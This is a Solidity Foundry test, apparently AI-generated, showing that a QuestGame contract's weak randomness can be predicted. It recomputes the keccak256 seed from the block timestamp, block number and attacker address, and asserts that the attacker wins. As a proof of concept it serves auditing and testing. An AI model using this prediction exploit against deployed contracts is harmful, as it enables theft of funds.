// Generation Time: 51,53s
// Input Tokens: 2664
// Output Tokens: 1078
// Reasoning Tokens: 814

// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {

    QuestGame public questGame;
    address public attacker;

    function setUp() public {
        questGame = new QuestGame{value: 1 ether}();
        
        attacker = address(0x1234);
        vm.deal(attacker, 10 ether);
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        vm.assume(blockTimestamp >= 1);
        vm.assume(blockNumber >= 1);
        vm.assume(blockTimestamp < type(uint256).max - 1 hours);
        
        vm.warp(blockTimestamp);
        vm.roll(blockNumber);
        
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp, 
                    block.number, 
                    attacker
                )
            )
        );
        uint256 predictedNumber = seed % 100;
        
        vm.prank(attacker);
        questGame.attemptQuest{value: 0.1 ether}(predictedNumber);
        
        (uint256 exp, uint256 wins) = questGame.getPlayerStats(attacker);
        assertEq(wins, 1, "Attacker should have won by predicting the random number");
        assertEq(exp, 100, "Attacker should have gained 100 experience");
    }
}
